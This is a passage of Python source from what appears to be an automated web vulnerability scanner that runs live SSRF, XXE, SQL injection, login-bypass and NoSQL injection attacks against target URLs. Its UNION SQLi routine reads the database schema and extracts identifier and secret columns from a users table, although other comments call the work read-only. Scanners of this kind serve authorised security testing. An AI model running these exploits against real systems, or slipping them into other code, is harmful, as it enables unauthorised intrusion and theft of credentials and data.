                confirmed = False
                # 1) regular SSRF — fetch cloud metadata and detect real content
                for payload, cloud in ssrf.METADATA_PAYLOADS:
                    r = await probe(c, p, payload, timeout=12)
                    if not r or r["error"]:
                        continue
                    hit = ssrf.analyze_reflection(r["body"], payload)
                    if hit:
                        findings.append(self._attach_poc(
                            ssrf.reflection_finding(url, p, payload, hit["cloud"], hit["matched"]),
                            r["target"], r))
                        evidence_targets.append(r["target"])
                        confirmed = True
                        break
                if confirmed:
                    continue
                # 2) blind SSRF — internal open-vs-closed port oracle
                open_pl = f"http://127.0.0.1:{open_port}/"
                closed_pl = f"http://127.0.0.1:{closed_port}/"
                o = await probe(c, p, open_pl, timeout=8)
                cl = await probe(c, p, closed_pl, timeout=8)
                sig = ssrf.analyze_blind(o, cl)
                if sig:
                    findings.append(self._attach_poc(
                        ssrf.blind_finding(url, p, open_pl, closed_pl, sig),
                        (o or {}).get("target") or ssrf.set_param(url, p, open_pl), o,
                        timing=f"open port {open_port} responded differently than closed port {closed_port} "
                               f"(open={(o or {}).get('elapsed', 0):.1f}s/{(o or {}).get('status')}, "
                               f"closed={(cl or {}).get('elapsed', 0):.1f}s/{(cl or {}).get('status')})"))
                    if o and o.get("target"):
                        evidence_targets.append(o["target"])
                    continue
                # 3) OOB: native collaborator confirms blind SSRF end-to-end
                if collab.enabled():
                    token = collab.new_token(); collab.register(token)
                    purl = collab.probe_url(token)
                    await probe(c, p, purl, timeout=8)
                    inter = []
                    for _ in range(6):                    # poll ~3s for the callback
                        inter = collab.hits(token)
                        if inter:
                            break
                        await asyncio.sleep(0.5)
                    if inter:
                        findings.append(self._attach_poc(
                            collab.oob_finding(url, p, purl, inter), ssrf.set_param(url, p, purl), None,
                            timing=f"out-of-band callback to {purl} fired from the target ({len(inter)} interaction(s))"))
                    else:
                        findings.append(ssrf.oob_finding(url, p, purl))
                    collab.clear(token)
                elif oob_domain:                          # external collaborator (advisory)
                    token = os.urandom(4).hex()
                    purl = f"http://{token}.{oob_domain}/"
                    await probe(c, p, purl, timeout=8)
                    findings.append(ssrf.oob_finding(url, p, purl))

        if self.mission_id and evidence_targets:
            await self._http(evidence_targets[0], "GET", capture=True)
        conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
        return ToolResult("ssrf", url, True,
                          f"tested {len(params)} param(s), {len(findings)} SSRF signal(s), {conf} confirmed",
                          findings)

    def _parse_cookies(self, extra: dict) -> dict:
        """Merge session-header cookies with an explicit cookies map."""
        jar = {}
        raw = ""
        for k, v in (self.session_headers or {}).items():
            if k.lower() == "cookie":
                raw = v
                break
        for part in raw.split(";"):
            if "=" in part:
                n, _, val = part.strip().partition("=")
                if n:
                    jar[n] = val
        jar.update({k: str(v) for k, v in (extra or {}).items()})
        return jar

    async def _run_deserialization(self, inp: dict) -> ToolResult:
        import httpx
        import deser_tool as deser
        from urllib.parse import parse_qsl, urlencode
        url = inp["url"]
        p = urlparse(url)
        query = dict(parse_qsl(p.query, keep_blank_values=True))
        only = set(inp.get("params") or [])
        if only:
            query = {k: v for k, v in query.items() if k in only}
        cookies = self._parse_cookies(inp.get("cookies"))
        inputs = deser.find_serialized_inputs(query, cookies)
        if not inputs:
            return ToolResult("deserialization", url, True,
                              "No serialized objects found in query params or cookies", [])

        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        all_q = dict(parse_qsl(p.query, keep_blank_values=True))

        def q_url(name, value):
            q = dict(all_q); q[name] = value
            return urlunparse(p._replace(query=urlencode(q)))

        def cookie_header(name, value):
            jar = dict(cookies); jar[name] = value
            return "; ".join(f"{k}={v}" for k, v in jar.items())

        findings = []
        async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=15) as c:
            for it in inputs:
                orig = it["value"] if isinstance(it["value"], str) else str(it["value"])
                bad = deser.corrupt(orig, it)
                try:
                    if it["location"] == "query":
                        base = await c.get(q_url(it["name"], orig), headers=headers)
                        probe = await c.get(q_url(it["name"], bad), headers=headers)
                    else:  # cookie
                        h_ok = {**headers, "Cookie": cookie_header(it["name"], orig)}
                        h_bad = {**headers, "Cookie": cookie_header(it["name"], bad)}
                        base = await c.get(url, headers=h_ok)
                        probe = await c.get(url, headers=h_bad)
                except Exception:
                    findings.append(deser.exposure_finding(url, it))
                    continue
                matched = deser.analyze_errors(base.text, probe.text, it["format"])
                findings.append(deser.error_finding(url, it, matched) if matched
                                else deser.exposure_finding(url, it))

        if self.mission_id and findings:
            await self._http(url, "GET", capture=True)
        conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
        return ToolResult("deserialization", url, True,
                          f"{len(inputs)} serialized input(s), {len(findings)} signal(s), {conf} confirmed",
                          findings)

    async def _run_exposure(self, inp: dict) -> ToolResult:
        import exposure_tool as exp
        base_url = inp["base_url"].rstrip("/")
        baseline = await self._http(f"{base_url}/bbh-nonexistent-{os.urandom(4).hex()}", capture=False)
        base_body = baseline.get("body", "")
        findings, confirmed_git, evid = [], [], []
        sem = asyncio.Semaphore(10)

        async def probe(check):
            url = f"{base_url}/{check['path']}"
            if not self.scope.validate(url)[0]:
                return
            async with sem:
                r = await self._http(url, capture=False)
            if r.get("error"):
                return
            f = exp.classify(check, r.get("status", 0), r.get("body", ""),
                             r["headers"].get("content-type", ""), base_body)
            if f:
                f["target"] = url
                findings.append(f)
                evid.append(url)
                if check["family"] == "git_exposure":
                    confirmed_git.append(check["path"])

        await asyncio.gather(*[probe(c) for c in exp.EXPOSURE_CHECKS])
        if any(p in confirmed_git for p in (".git/HEAD", ".git/config", ".git/index")):
            findings.append({**exp.git_reconstruct_finding(confirmed_git),
                             "target": f"{base_url}/.git/"})
        self.recon.setdefault("exposure", []).extend(f["title"] for f in findings)
        if self.mission_id and evid:
            await self._http(evid[0], "GET", capture=True)
        return ToolResult("exposure", base_url, True,
                          f"{len(exp.EXPOSURE_CHECKS)} checks, {len(findings)} exposure(s)", findings)

    async def _run_xxe(self, inp: dict) -> ToolResult:
        import httpx
        import collaborator as collab
        import xxe_tool as xxe
        url = inp["url"]
        sample = inp.get("xml", "")
        # Build a schema-shaped XML body from the captured form fields (e.g. the
        # stock-check <productId>/<storeId> form) so the entity lands in a field the
        # server actually parses — the missing link that stopped run_xxe reaching
        # the POST sink. build_inband_xml injects the DOCTYPE + entity into it.
        if not sample and inp.get("fields"):
            inner = "".join(f"<{re.sub(r'[^A-Za-z0-9_.-]', '', str(fld))}>1</{re.sub(r'[^A-Za-z0-9_.-]', '', str(fld))}>"
                            for fld in inp["fields"] if str(fld).strip())
            if inner:
                sample = f"<data>{inner}</data>"
        ctype = inp.get("content_type", "application/xml")
        headers = {"User-Agent": _UA, "Content-Type": ctype, **(self.session_headers or {})}
        findings = []
        async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=15) as c:
            # 1) in-band local file read
            for file_uri, _rx in xxe.FILE_TARGETS:
                payload = xxe.build_inband_xml(file_uri, sample)
                try:
                    r = await c.post(url, headers=headers, content=payload.encode())
                except Exception:
                    continue
                hit = xxe.analyze_inband(r.text)
                if hit:
                    findings.append(xxe.inband_finding(url, hit["file"], hit["match"]))
                    break
            # 2) blind XXE via the native OOB collaborator
            if collab.enabled():
                token = collab.new_token(); collab.register(token)
                purl = collab.probe_url(token)
                try:
                    await c.post(url, headers=headers, content=xxe.build_oob_xml(purl, sample).encode())
                except Exception:
                    pass
                inter = []
                for _ in range(6):
                    inter = collab.hits(token)
                    if inter:
                        break
                    await asyncio.sleep(0.5)
                if inter:
                    findings.append(xxe.oob_finding(url, purl, inter))
                collab.clear(token)
            # 3) timing-based blind XXE → SSRF: an external SYSTEM entity pointed at a
            # black-hole host stalls the response (the server made the outbound request).
            # Non-destructive — the target is a reserved TEST-NET IP that routes nowhere.
            if not any(f.get("confidence") == "confirmed" for f in findings):
                import time as _time

                async def _timed(body: str, to: float = 12.0) -> float:
                    t0 = _time.perf_counter()
                    try:
                        await c.post(url, headers=headers, content=body.encode(),
                                     timeout=httpx.Timeout(to))
                    except Exception:
                        pass
                    return _time.perf_counter() - t0

                import statistics as _stats
                base_body = sample or "<data><productId>1</productId><storeId>1</storeId></data>"
                base_samples = [await _timed(base_body) for _ in range(3)]   # 3 benign baselines
                baseline = min(base_samples)
                blackhole = "http://192.0.2.1:9/"          # TEST-NET-1 (RFC5737), unroutable → connect hang
                # Two entity forms — try both so a parser that blocks one is still probed:
                #   • general entity referenced inside an element (&xxe;) — this is accepted
                #     even when the parser rejects parameter entities ("Entities are not
                #     allowed for security reasons"), the common hardened default;
                #   • parameter entity in the internal subset — for parsers that allow those.
                stall_body, stall_kind, stall_samples = None, "", []
                for kind, body in (("general entity (&xxe; in element)", xxe.build_inband_xml(blackhole, sample)),
                                   ("parameter entity (internal subset)", xxe.build_oob_xml(blackhole, sample))):
                    d0 = await _timed(body)
                    if baseline < 1.8 and (d0 - baseline) > 3.0:
                        # repeat twice more so the stall is proven consistent, not a blip
                        stall_samples = [d0] + [await _timed(body) for _ in range(2)]
                        stall_body, stall_kind = body, kind
                        break
                if stall_body is not None:
                    _mb, _ms = _stats.median(base_samples), _stats.median(stall_samples)
                    _tbl = ("| Sample | Baseline (benign body) | External-entity payload |\n"
                            "|---|---|---|\n"
                            + "\n".join(f"| {i + 1} | {b:.2f}s | {s:.2f}s |"
                                        for i, (b, s) in enumerate(zip(base_samples, stall_samples)))
                            + f"\n| median | {_mb:.2f}s | {_ms:.2f}s |")
                    findings.append(self._attach_poc({
                        "severity": "high", "cwe": "CWE-611", "target": url, "content_type": ctype,
                        "title": "Blind XXE -> SSRF (external entity dereference, timing-confirmed)",
                        "confidence": "confirmed", "family": "xxe", "tags": ["xxe", "ssrf", "blind"],
                        "description": (
                            f"A POST XML body (Content-Type: {ctype}) declaring an external SYSTEM entity "
                            f"({stall_kind}) pointed at an unreachable black-hole host (192.0.2.1:9 — TEST-NET-1, "
                            "reserved and unroutable) makes the server's XML parser attempt an OUTBOUND request while "
                            "parsing. The benign baseline body returns immediately; the external-entity body stalls on "
                            "the connect timeout every time. That the delay tracks the entity (and nothing else in the "
                            "body changes) proves the parser dereferenced attacker-controlled external entities — a "
                            "server-side request forgery primitive. Non-destructive: the target IP routes nowhere."),
                        "evidence": (f"External SYSTEM entity ({stall_kind}) -> unreachable host. Median baseline "
                                     f"{_mb:.2f}s vs median external-entity {_ms:.2f}s (delta {_ms - _mb:.2f}s), "
                                     f"consistent across 3 samples each."),
                        "impact": ("The server can be coerced into outbound requests (SSRF) to internal-only services "
                                   "or cloud metadata (169.254.169.254); with a reachable collaborator the response "
                                   "can be exfiltrated, and file:// entities may read local files depending on parser "
                                   "config."),
                        "false_positive_check": (
                            f"Three benign baselines ({', '.join(f'{b:.2f}s' for b in base_samples)}) are all fast; "
                            f"three external-entity requests ({', '.join(f'{s:.2f}s' for s in stall_samples)}) are all "
                            "stalled by ~5s (the OS connect timeout to the black-hole). The ONLY difference between the "
                            "two bodies is the SYSTEM entity, so the entity fetch is the isolated cause. One slow "
                            "sample could be a network blip; three consistent stalls against three fast baselines "
                            "cannot be."),
                        "baseline": f"POST {url}\nContent-Type: {ctype}\n\n{base_body}",
                        "timing": _tbl,
                    }, url, None, method="POST", body=stall_body))
        if self.mission_id and findings:
            await self._http(url, "POST", {"Content-Type": ctype}, body=sample or "<root/>", capture=True)
        conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
        return ToolResult("xxe", url, True, f"{len(findings)} XXE signal(s), {conf} confirmed", findings)

    async def _sqli_union(self, c, get, url: str, p: str, orig: str):
        """Escalate a CONFIRMED reflected SQLi into a UNION data extraction (read-only).
        Discovers the injection context (the closing that balances the query + the column
        count) by marker reflection, then dumps the DB catalogue and a users-like table.
        Nothing target-specific is hardcoded; bounded and scope-guarded. Returns
        {finding, req, resp} or None."""
        import sqli_tool as sqli
        # 1) discover (closing, ncols) — stop at the first reflected marker
        ctx = None
        for closing in sqli.UNION_CLOSINGS:
            for ncols in range(1, 11):
                r, _ = await get(c, xt.set_param(url, p, sqli.union_count_probe(orig, closing, ncols)))
                if r is not None and sqli.union_hit(r.text):
                    ctx = (closing, ncols)
                    break
            if ctx:
                break
        if not ctx:
            return None
        closing, ncols = ctx
        # 2) dump the schema (sqlite catalogue, then information_schema)
        schema = ""
        for expr in sqli.schema_exprs():
            r, _ = await get(c, xt.set_param(url, p, sqli.union_extract_probe(orig, closing, ncols, expr)))
            if r is not None and ("CREATE TABLE" in r.text or "~~" in r.text):
                schema = r.text
                break
        tables = sqli.parse_tables(schema)
        # 3) dump a users-like table's identifier + secret columns
        creds, last_r, last_req = [], None, None
        ut = sqli.parse_users_table(schema)
        if ut:
            cols = sqli.parse_columns(schema, ut)
            req = xt.set_param(url, p, sqli.union_extract_probe(orig, closing, ncols, sqli.creds_expr(ut, cols)))
            r, _ = await get(c, req)
            if r is not None:
                creds = sqli.parse_creds(r.text)
                last_r, last_req = r, req
        if not tables and not creds:
            return None
        req = last_req or xt.set_param(url, p, sqli.union_count_probe(orig, closing, ncols))
        self.state.add_capability(self._Capability.DATABASE_READ, f"UNION SQLi read {len(tables)} table(s) via '{p}'")
        if creds:
            self.state.add_capability(self._Capability.PASSWORD_HASH_OBTAINED, f"{len(creds)} credential(s) extracted")
        return {"finding": sqli.union_finding(url, p, ncols, closing, tables, creds),
                "req": req, "resp": last_r}

    async def _run_sqli(self, inp: dict) -> ToolResult:
        import time
        import httpx
        import sqli_tool as sqli
        from urllib.parse import parse_qsl
        url = inp["url"]
        params = (inp.get("params") or xt.params_of(url))[:self._ni(8, 16, 40)]
        if not params:
            return ToolResult("sqli", url, True, "No query parameters to test", [])
        seconds = max(3, min(int(inp.get("delay", 5)), 15))
        qvals = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, ev = [], []

        async def get(c, target):
            if not self.scope.validate(target)[0]:
                return None, 0.0
            t0 = time.perf_counter()
            try:
                r = await c.get(target)
                return r, time.perf_counter() - t0
            except Exception:
                return None, time.perf_counter() - t0

        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers,
                                     timeout=seconds + 20) as c:
            base_r, _ = await get(c, url)
            base_body = base_r.text if base_r is not None else ""
            base_status = base_r.status_code if base_r is not None else 0
            union_done = False   # UNION escalation runs at most once per call (bounded)
            for p in params:
                orig = qvals.get(p, "1")
                confirmed = False
                # 1) error-based (DBMS error TEXT)
                for probe in sqli.ERROR_PROBES[:self._ni(3, 6, len(sqli.ERROR_PROBES))]:
                    r, _ = await get(c, xt.set_param(url, p, orig + probe))
                    if r is None:
                        continue
                    hits = sqli.error_signatures(base_body, r.text)
                    if hits:
                        _req = xt.set_param(url, p, orig + probe)
                        findings.append(self._attach_poc(sqli.error_finding(url, p, probe, hits), _req, r))
                        ev.append(_req); confirmed = True
                        break
                # 1b) quote-break / doubled-quote-recovery (status differential — fires
                #     when a 500 leaks no SQL text, as on ginandjuice's category filter)
                if not confirmed:
                    r_sq, _ = await get(c, xt.set_param(url, p, orig + "'"))
                    r_dq, _ = await get(c, xt.set_param(url, p, orig + "''"))
                    if r_sq is not None and r_dq is not None and sqli.quote_break_recovers(
                            base_status, r_sq.status_code, r_dq.status_code):
                        _req = xt.set_param(url, p, orig + "'")
                        findings.append(self._attach_poc(sqli.quote_recovery_finding(
                            url, p, base_status, r_sq.status_code, r_dq.status_code), _req, r_sq))
                        ev.append(_req); confirmed = True
                # 1c) ESCALATE a confirmed reflected injection into proof-by-data: a UNION
                #     SELECT that balances the query and reads out the schema + a users
                #     table. Runs at most once per call (the first reflected confirmation),
                #     read-only, scope-guarded — this is what turns "injection present"
                #     into "here is the data it leaks" (and auto-solves data-exfil goals).
                if confirmed and not union_done:
                    union_done = True
                    uf = await self._sqli_union(c, get, url, p, orig)
                    if uf:
                        findings.append(self._attach_poc(uf["finding"], uf["req"], uf["resp"]))
                        ev.append(uf["req"])
                if confirmed:
                    continue
                # 2) boolean-based blind
                for pair in sqli.boolean_payloads(orig):
                    rt, _ = await get(c, xt.set_param(url, p, pair["true"]))
                    rf, _ = await get(c, xt.set_param(url, p, pair["false"]))
                    if rt is None or rf is None:
                        continue
                    if sqli.analyze_boolean(base_body, rt.text, rf.text):
                        _req = xt.set_param(url, p, pair["false"])
                        _tv = xt.set_param(url, p, pair["true"])
                        findings.append(self._attach_poc(
                            sqli.boolean_finding(url, p, pair), _req, rf,
                            timing=f"TRUE payload ({_tv}) tracked the baseline; FALSE payload ({_req}) diverged"))
                        ev.append(_req); confirmed = True
                        break
                if confirmed:
                    continue
                # 3) time-based blind (only when quieter oracles found nothing)
                for item in sqli.time_payloads(orig, seconds):
                    _, ctl = await get(c, xt.set_param(url, p, item["control"]))
                    _, slp = await get(c, xt.set_param(url, p, item["payload"]))
                    if sqli.analyze_time(ctl, slp, seconds):
                        _req = xt.set_param(url, p, item["payload"])
                        findings.append(self._attach_poc(
                            sqli.time_finding(url, p, item, ctl, slp, seconds), _req, None,
                            timing=f"control={ctl:.1f}s vs injected-SLEEP({seconds}s)={slp:.1f}s"))
                        ev.append(_req)
                        break

        if self.mission_id and ev:
            await self._http(ev[0], "GET", capture=True)
        # DB-METADATA ENRICHMENT: a CONFIRMED native SQLi gets read-only DB proof
        # (version/current user/schema/database) attached — data-plane depth on the exact
        # injectable endpoint, WITHOUT the deep planner-wide sqlmap fan-out. deep/insane only.
        # Native UNION extraction first (deterministic, reliable); sqlmap as the fallback for
        # non-UNION (boolean/time-based) injections. Both are strictly read-only.
        if findings and getattr(self, "intensity", "standard") in ("deep", "insane"):
            _tgt = findings[0].get("target") or url
            proof, settings = await self._sqli_db_metadata(_tgt)
            if not proof:
                proof, settings = await self._sqlmap_enrich(_tgt)
            if proof:
                findings[0]["evidence"] = ((findings[0].get("evidence") or "")
                                           + "\n\nDatabase access (read-only — no data dumped): " + proof).strip()
                findings[0]["database_proof"] = proof
                findings[0]["severity"] = "critical"          # data-plane access confirmed
                findings[0]["settings"] = ((findings[0].get("settings") or "sqli oracle")
                                           + " ; enrich: " + settings).strip(" ;")
        return ToolResult("sqli", url, True,
                          f"tested {len(params)} param(s), {len(findings)} confirmed SQLi", findings)

    async def _sqlmap_enrich(self, url: str) -> tuple:
        """Read-only DB-metadata extraction for a CONFIRMED SQLi: run sqlmap on the exact
        injectable URL and pull whatever it proves — injection techniques, back-end DBMS
        (confirmed or heuristic), banner, current user/db, database names. NEVER --dump
        (no data theft). Attaches what actually landed, never fabricates. Returns
        (proof_string, settings) or ('', '')."""
        import re as _re
        cmd = ["sqlmap", "-u", url, "--batch", "--flush-session", "--random-agent",
               "--technique", "BEU", "--level", "3", "--risk", "2",
               "--current-user", "--current-db", "--banner", "--dbs"]
        _hdrs = self.session_headers or {}
        _ck = _hdrs.get("Cookie") or _hdrs.get("cookie")
        if _ck:
            cmd += ["--cookie", _ck]
        out, err = await self._cmd(cmd, timeout=420)
        if err.startswith("__MISSING__") or (
                "is vulnerable" not in out and "sqlmap identified" not in out and "the following injection" not in out):
            return "", ""
        proof = _parse_sqlmap_proof(out)                 # parameter, techniques, payloads, DBMS
        parts = []
        dbms = proof.get("dbms") or ""
        if not dbms:
            h = _re.search(r"back-end DBMS could be '([^']+)'", out)
            if h:
                dbms = h.group(1).strip() + " (heuristic)"
        if dbms:
            parts.append(f"DBMS={dbms}")
        for lbl, key in (("banner", "banner"), ("current user", "current_user"),
                         ("current database", "current_db")):
            m = _re.search(lbl + r":\s*'([^'\n\r]+)'", out)
            if m:
                parts.append(f"{key}={m.group(1).strip()}")
        mdb = _re.search(r"available databases \[\d+\]:\s*((?:\s*\[\*\][^\n]+\n?)+)", out)
        if mdb:
            names = [n.strip() for n in _re.findall(r"\[\*\]\s*([^\n\r]+)", mdb.group(1))]
            if names:
                parts.append("databases=" + ",".join(names[:8]))
        if proof.get("types"):
            parts.append("techniques=" + "; ".join(proof["types"][:4]))
        settings = " ".join(cmd[3:])
        if not parts:
            return ("sqlmap independently confirmed the injection point (read-only)", settings)
        return " | ".join(parts), settings

    async def _sqli_db_metadata(self, url: str) -> tuple:
        """Native UNION-based read-only DB-metadata extraction for a CONFIRMED SQLi.
        Reflects DB version / current user / current schema / database through the
        vulnerable UNION column and reads them back — SELECT-only, never touches user
        tables, never writes. The marker is assembled by the DB from CHAR() codes (so it
        is ABSENT from the request text), and a 2+2=4 sanity check proves the value came
        from SQL EXECUTION, not input reflection. Deterministic and far more reliable
        than a DBMS fingerprint. Returns (proof, settings) or ('', ''). Non-destructive."""
        import httpx
        from urllib.parse import parse_qsl
        params = xt.params_of(url)
        if not params:
            return "", ""
        qvals = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        headers = {"User-Agent": _UA, **(self.session_headers or {})}

        def _chars(tag):
            return [f"CHAR({ord(ch)})" for ch in tag]

        def marker(tag, mode):                        # DB-assembled token (not in the request text)
            cc = _chars(tag)
            return "||".join(cc) if mode == "pipe" else "CONCAT(" + ",".join(cc) + ")"

        def concat3(a, mid, b, mode):
            return f"{a}||{mid}||{b}" if mode == "pipe" else f"CONCAT({a},{mid},{b})"

        def cast(fn, mode):
            return f"CAST(({fn}) AS {'VARCHAR' if mode == 'pipe' else 'CHAR'})"

        def unhtml(s):
            return (s.replace("&apos;", "'").replace("&quot;", '"')
                     .replace("&amp;", "&").replace("&#39;", "'"))

        async with httpx.AsyncClient(verify=False, follow_redirects=True,
                                     headers=headers, timeout=25) as c:
            async def q(p, payload):
                t = xt.set_param(url, p, payload)
                if not self.scope.validate(t)[0]:
                    return 0, ""
                try:
                    r = await c.get(t)
                    return r.status_code, r.text
                except Exception:
                    return 0, ""

            for p in params[:3]:
                orig = qvals.get(p, "1") or "1"
                for mode in ("pipe", "concat"):        # || (H2/PG/Oracle/SQLite) then CONCAT() (MySQL)
                    # ── column count: a well-formed UNION SELECT NULL×n stops erroring ──
                    widths = []
                    for n in range(1, 14):
                        st, _ = await q(p, f"{orig}' UNION ALL SELECT {','.join(['NULL'] * n)}-- -")
                        if st and st < 400:
                            widths.append(n)
                    # ── reflected column: CHAR-marker per position (numeric cols reject it) ──
                    found = None
                    for n in widths[:4]:
                        for pos in range(n):
                            tag = f"QZ{chr(65 + pos)}7"
                            row = ["NULL"] * n
                            row[pos] = marker(tag, mode)
                            _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
                            if body and tag in unhtml(body):
                                found = (n, pos)
                                break
                        if found:
                            break
                    if not found:
                        continue
                    n, pos = found
                    B = marker("QZX7", mode)           # boundary the DB assembles around each value

                    async def extract(fn):
                        row = ["NULL"] * n
                        row[pos] = concat3(B, cast(fn, mode), B, mode)
                        _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
                        if not body:
                            return None
                        m = re.search(r"QZX7(.*?)QZX7", unhtml(body), re.S)
                        v = m.group(1).strip() if m else None
                        return v if (v and 0 < len(v) < 256 and v.upper() != "NULL") else None

                    if await extract("2+2") != "4":     # DB isn't evaluating here -> wrong point/mode
                        continue
                    fields = (("version", ("H2VERSION()", "VERSION()", "version()", "@@VERSION")),
                              ("current user", ("CURRENT_USER", "CURRENT_USER()", "USER()", "SYSTEM_USER", "USER")),
                              ("current schema", ("SCHEMA()", "CURRENT_SCHEMA", "CURRENT_SCHEMA()")),
                              ("database", ("DATABASE()", "CURRENT_CATALOG", "DB_NAME()")))
                    parts = []
                    for label, cands in fields:
                        for fn in cands:
                            v = await extract(fn)
                            if v:
                                parts.append(f"{label}={v}")
                                break
                    if parts:
                        settings = (f"native UNION extraction via '{p}' "
                                    f"({n} columns, reflected column {pos + 1}, {mode} concat)")
                        return " | ".join(parts), settings
        return "", ""

    async def _run_auth_sqli(self, inp: dict) -> ToolResult:
        """POST/JSON body auth-bypass SQLi on a login-style endpoint — the injection
        class that query-string probes never reach (e.g. a JSON {email,password}
        login). Baseline with a benign credential, then inject SQLi into each
        credential field and confirm a real bypass (token/200 issued) or a SQL error.
        Non-destructive: it only submits login attempts, never changes state."""
        import json as _json
        import sqli_tool as sqli
        url = inp["url"]
        fields = [f for f in (inp.get("fields") or []) if isinstance(f, str)]
        cred_fields = [f for f in fields if any(h in f.lower() for h in sqli.LOGIN_FIELD_HINTS)] or ["email", "username"]
        pw_field = next((f for f in fields if "pass" in f.lower()), "password")
        headers = {"Content-Type": "application/json"}
        findings, ev = [], []
        for field in cred_fields[:2]:
            benign = "bbh_" + os.urandom(4).hex() + "@test.invalid"
            base_body = _json.dumps({field: benign, pw_field: "bbh_" + os.urandom(3).hex()})
            rb = await self._http(url, "POST", headers, base_body, capture=False)
            if rb.get("error") or not rb.get("status"):
                continue
            for payload in sqli.AUTH_BYPASS_PAYLOADS:
                inj_body = _json.dumps({field: payload, pw_field: "x"})
                ri = await self._http(url, "POST", headers, inj_body, capture=False)
                if ri.get("error"):
                    continue
                hits = sqli.error_signatures(rb.get("body", ""), ri.get("body", ""))
                if hits:
                    f = self._attach_poc(sqli.error_finding(url, field, payload, hits),
                                         url, ri, method="POST", body=inj_body)
                    await self._http(url, "POST", headers, inj_body, capture=True)
                    findings.append(f); ev.append(inj_body); break
                conf = sqli.auth_bypass_confirmed(rb.get("status", 0), rb.get("body", ""),
                                                  ri.get("status", 0), ri.get("body", ""))
                if conf:
                    findings.append(self._attach_poc(
                        sqli.auth_bypass_finding(url, field, payload, conf["signal"]),
                        url, ri, method="POST", body=inj_body))
                    await self._http(url, "POST", headers, inj_body, capture=True)
                    ev.append(inj_body); break
            if findings:
                break
        summary = ("auth-bypass SQLi CONFIRMED on the login body" if findings
                   else "no body auth-bypass SQLi on this endpoint")
        return ToolResult("auth_sqli", url, True, summary, findings)

    async def _run_nosqli(self, inp: dict) -> ToolResult:
        """NoSQL (MongoDB-style) operator injection on a parameterized URL. Appends
        an operator suffix to the param NAME (id[$ne]=..., id[$regex]=...) and
        compares against a plain non-matching-value control — an operator that
        broadens the match back to baseline-shaped output, while the control does
        not, confirms the parameter reaches a NoSQL query unsanitised. Also checks
        for a driver error signature. Read-only payloads."""
        import httpx
        import nosqli_tool as ns
        url = inp["url"]
        # bounded to 4 params — each param costs up to ~7 remote round-trips across
        # the error + boolean stages, and this runs alongside sqli/cmdi/xss/etc. on
        # the same endpoint, so keeping this tight matters for scan wall-clock time.
        params = (inp.get("params") or xt.params_of(url))[:self._ni(4, 8, 16)]
        if not params:
            return ToolResult("nosqli", url, True, "No query parameters to test", [])
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, ev = [], []

        async def get(c, target):
            if not self.scope.validate(target)[0]:
                return None
            try:
                return await c.get(target)
            except Exception:
                return None

        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=15) as c:
            base_r = await get(c, url)
            base_body = base_r.text if base_r is not None else ""
            for p in params:
                confirmed = False
                # 1) error-based: an operator payload that a naive concatenation breaks.
                # set_operator_param REMOVES the original p=... pair and adds p[$op]=...
                # — xt.set_param cannot inject a new key, only replace an existing one,
                # so using it here would silently no-op and re-request the baseline.
                for suffix in ns.OPERATOR_SUFFIXES:
                    probe_url = ns.set_operator_param(url, p, suffix, "bbh_nosqli_probe")
                    r = await get(c, probe_url)
                    if r is None:
                        continue
                    hits = ns.error_signatures(base_body, r.text)
                    if hits:
                        findings.append(self._attach_poc(ns.error_finding(url, p, suffix, hits), probe_url, r))
                        ev.append(probe_url); confirmed = True
                        break
                if confirmed:
                    continue
                # 2) boolean-based: operator broadens the match vs a plain non-matching
                # value control on the SAME (non-operator) param name. The "missing
                # param" false-positive baseline is fetched LAZILY, only when we
                # actually reach this stage (skipped whenever error-based confirms).
                miss_r = await get(c, ns.missing_param_url(url, p))
                miss_body = miss_r.text if miss_r is not None else None
                ctl_url = xt.set_param(url, p, "bbh_nosqli_" + os.urandom(3).hex())
                ctl_r = await get(c, ctl_url)
                ctl_body = ctl_r.text if ctl_r is not None else ""
                for pair in ns.boolean_probe_pairs(p):
                    op_url = ns.set_operator_param(url, p, pair["suffix"], pair["value"])
                    op_r = await get(c, op_url)
                    if op_r is None:
                        continue
                    if ns.analyze_boolean(base_body, op_r.text, ctl_body, miss_body):
                        findings.append(self._attach_poc(
                            ns.boolean_finding(url, p, pair["ctx"]), op_url, op_r,
                            timing=f"operator payload broadened the match vs control ({ctl_url})"))
                        ev.append(op_url); confirmed = True
                        break
                if confirmed:
                    continue

        if self.mission_id and ev:
            await self._http(ev[0], "GET", capture=True)
        return ToolResult("nosqli", url, True,
                          f"tested {len(params)} param(s), {len(findings)} confirmed NoSQL injection", findings)

    async def _run_form_nosqli(self, inp: dict) -> ToolResult:
        """POST/JSON body NoSQL auth-bypass on a login-style endpoint — the canonical
        MongoDB login bypass ({"$ne": null} in place of a credential string), the
        class query-string probes never reach. Baselines with a benign credential,
        injects operator objects into each credential field, confirms a real bypass
        (token/200 issued). Non-destructive: only submits login attempts."""
        import json as _json
        import nosqli_tool as ns
        url = inp["url"]
        fields = [f for f in (inp.get("fields") or []) if isinstance(f, str)]
        cred_fields = [f for f in fields if any(h in f.lower() for h in ns.LOGIN_FIELD_HINTS)] or ["email", "username"]
        pw_field = next((f for f in fields if "pass" in f.lower()), "password")
        headers = {"Content-Type": "application/json"}
        findings = []
        for field in cred_fields[:2]:
            benign = "bbh_" + os.urandom(4).hex() + "@test.invalid"
            base_body = _json.dumps({field: benign, pw_field: "bbh_" + os.urandom(3).hex()})
            rb = await self._http(url, "POST", headers, base_body, capture=False)
            if rb.get("error") or not rb.get("status"):
                continue
            for operator in ns.AUTH_BYPASS_OPERATORS:
                inj_body = _json.dumps({field: operator, pw_field: operator})
                ri = await self._http(url, "POST", headers, inj_body, capture=False)
                if ri.get("error"):
                    continue
                conf = ns.auth_bypass_confirmed(rb.get("status", 0), rb.get("body", ""),
